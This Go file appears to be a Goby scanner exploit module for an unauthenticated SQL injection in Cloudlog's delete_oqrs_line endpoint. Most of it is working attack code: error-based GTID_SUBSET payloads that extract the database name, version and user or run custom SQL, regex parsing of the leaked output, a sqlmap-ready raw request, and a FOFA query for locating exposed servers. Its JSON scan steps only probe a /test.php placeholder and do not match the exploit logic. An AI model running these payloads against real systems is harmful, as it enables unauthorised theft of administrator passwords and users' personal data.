package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Cloudlog /delete_oqrs_line SQL Injection Vulnerability",
    "Description": "<p>Cloudlog is a self-hosted PHP application that allows you to record your amateur radio contacts anywhere. Web-based amateur radio recording applications built using PHP and MySQL support general station recording tasks from HF to microwave. </p><p>In addition to exploiting the SQL injection vulnerability to obtain information in the delete_oqrs_line database (for example, administrator background passwords and site user personal information), an unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.</p>",
    "Product": "CloudLoggerSCADA-v-1.0",
    "Homepage": "https://www.magicbug.co.uk/cloudlog/",
    "DisclosureDate": "2024-10-15",
    "PostTime": "2024-10-16",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"selectize.js\" && body=\"Cloudlog\"",
    "GobyQuery": "body=\"selectize.js\" && body=\"Cloudlog\"",
    "Level": "1",
    "Impact": "<p>In addition to exploiting the SQL injection vulnerability to obtain information in the delete_oqrs_line database (for example, administrator background passwords and site user personal information), an unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/142954361"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "GTID_SUBSET(CONCAT((SELECT VERSION())), 666)",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "Cloudlog /delete_oqrs_line SQL 注入漏洞",
            "Product": "Cloudlog",
            "Description": "<p>Cloudlog 是一个自托管的 PHP 应用程序，可让您在任何地方记录您的业余无线电联系人。使用PHP和MySQL构建的基于Web的业余无线电记录应用程序支持从HF到微波的一般站记录任务。</p><p>Cloudlog delete_oqrs_line 接口存在未授权SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>Cloudlog delete_oqrs_line 接口存在未授权SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Cloudlog /delete_oqrs_line SQL Injection Vulnerability",
            "Product": "CloudLoggerSCADA-v-1.0",
            "Description": "<p>Cloudlog is a self-hosted PHP application that allows you to record your amateur radio contacts anywhere. Web-based amateur radio recording applications built using PHP and MySQL support general station recording tasks from HF to microwave.&nbsp;</p><p>In addition to exploiting the SQL injection vulnerability to obtain information in the delete_oqrs_line database (for example, administrator background passwords and site user personal information), an unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In addition to exploiting the SQL injection vulnerability to obtain information in the delete_oqrs_line database (for example, administrator background passwords and site user personal information), an unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9961"
}`
	setSqlPayloadHashasduahscjkajsvdcjdsvchgshfhuagvkgchsgjahhbgvshclbgamcshlyrgbvhlus := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, sqlUrl string, head map[string]string) (*httpclient.HttpResponse, error) {
			//对sql进行url编码
			sql = url.QueryEscape(sql)
			postRequest := httpclient.NewPostRequestConfig(sqlUrl)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			postRequest.Data = "id=" + sql
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		urlget := "/index.php/oqrs/delete_oqrs_line"

		resp, err = setGetRequest(hostInfo, urlget, map[string]string{})
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = " /index.php/oqrs/delete_oqrs_line"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "c72decc0a16932f21ab2a090af1aa21d"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `GTID_SUBSET(CONCAT((SELECT md5('aasfcacxaasdcaxas'))), 666)`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `specification '([\s\S]*?)'`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasduahscjkajsvdcjdsvchgshfhuagvkgchsgjahhbgvshclbgamcshlyrgbvhlus
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `POST /index.php/oqrs/delete_oqrs_line HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
 
id=GTID_SUBSET(CONCAT((SELECT md5('aasfcacxaasdcaxas'))), 666)`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `specification '([\s\S]*?)'`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasduahscjkajsvdcjdsvchgshfhuagvkgchsgjahhbgvshclbgamcshlyrgbvhlus
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "GTID_SUBSET(CONCAT((SELECT database())), 666)"
					} else if way == "db_version" {
						sql = "GTID_SUBSET(CONCAT((SELECT version())), 666)"
					} else if way == "user_name" {
						sql = "GTID_SUBSET(CONCAT((SELECT user())), 666)"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
